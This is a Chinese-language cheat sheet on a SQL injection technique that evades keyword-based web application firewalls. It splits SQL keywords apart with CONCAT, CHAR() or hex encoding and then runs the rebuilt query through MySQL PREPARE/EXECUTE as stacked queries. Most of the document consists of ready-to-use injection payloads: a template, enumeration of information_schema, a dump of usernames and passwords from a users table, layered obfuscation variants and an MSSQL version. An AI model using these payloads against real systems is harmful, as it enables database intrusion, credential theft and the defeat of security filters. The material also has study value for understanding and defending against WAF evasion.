# 预编译语句绕过 (Prepared Statement Bypass)

## 核心原理

WAF 通常检测 SQL 注入关键词（`SELECT`、`UNION`、`FROM` 等）。预编译语句将危险关键词拆分为字符串片段，通过 `CONCAT` 拼接后在运行时执行，使关键词在原始 SQL 上下文中不可见，从而绕过基于关键词匹配的 WAF 规则。

**利用特性**：MySQL 支持在用户 SQL 会话中使用 `PREPARE` / `EXECUTE`，这是 MySQL 客户端协议层的合法功能，而不仅是存储过程专用。

## Payload 模板

```
1';set @a=concat('se','lect * from `table_name`;');prepare flag from @a;execute flag;#
```

## 逐段解析

```
1';
```
闭合前面的单引号，结束原始 SQL 语句的字符串上下文。

```
set @a=concat('se','lect * from `table_name`;');
```
- `concat()` 函数将多个字符串片段组合成一个完整字符串
- `'se' + 'lect'` → `select`，绕过 WAF 对 `SELECT` 关键词的检测
- `@a` 定义了一个 MySQL 用户变量 a
- `set` 函数让变量 a 接收 `concat` 拼接的结果

```
prepare flag from @a;
```
将 `@a` 中存储的字符串作为 SQL 代码进行预编译。`flag` 是预编译语句的标识符。

```
execute flag;
```
执行之前预编译的语句。

```
#
```
MySQL 注释符，将源码中之后的 SQL 部分注释掉，避免语法错误。

## 完整示例

### 查询指定表数据

```sql
1';set @a=concat('se','lect * from `1919810931114514`;');prepare flag from @a;execute flag;#
```

### 查询 information_schema

```sql
1';set @a=concat('se','lect group_concat(table_name) from information_schema.tables where table_schema=da','tabase()');prepare flag from @a;execute flag;#
```

### 脱库

```sql
1';set @a=concat('se','lect group_concat(username,0x7e,password) from users');prepare flag from @a;execute flag;#
```

## 进阶变形

### 多层拼接（对抗深度检测）

```sql
1';set @b=char(115,101,108,101,99,116);set @c=concat(@b,' * from `table_name`;');prepare flag from @c;execute flag;#
```

`char(115,101,108,101,99,116)` 生成 `select` 字符串，完全避开关键词字符。

### 十六进制表示

```sql
1';set @a=0x73656C656374202A2046524F4D20603139313938313039333131313435313460;prepare flag from @a;execute flag;#
```

`0x73656C...` 是 `select * from \`1919810931114514\`` 的十六进制编码。

### 分段十六进制拼接

```sql
1';set @a=concat(0x73656c656374202a20,0x66726f6d206031393139383130,0x39333131313435313460);prepare flag from @a;execute flag;#
```

### CHAR 函数 (MSSQL 等价)

```sql
';DECLARE @s VARCHAR(100);SET @s=CHAR(115)+CHAR(101)+CHAR(108)+CHAR(101)+CHAR(99)+CHAR(116);SET @s=@s+CHAR(32)+CHAR(42)+CHAR(32)+CHAR(70)+CHAR(82)+CHAR(79)+CHAR(77)+CHAR(32)+CHAR(117)+CHAR(115)+CHAR(101)+CHAR(114)+CHAR(115);EXEC(@s)--
```

## 适用条件

- MySQL 数据库（`PREPARE` 和 `EXECUTE` 是 MySQL 特性）
- 注入点支持堆叠查询（驱动允许 multi-statement）
- WAF 基于关键字正则匹配而非 AST 语法分析

## 局限性

- 仅适用于 MySQL
- 需要堆叠查询支持
- 预编译语句本身不绕过 WAF 对 `PREPARE`/`EXECUTE` 关键字的检测——如果 WAF 也过滤这些关键词，需进一步变形
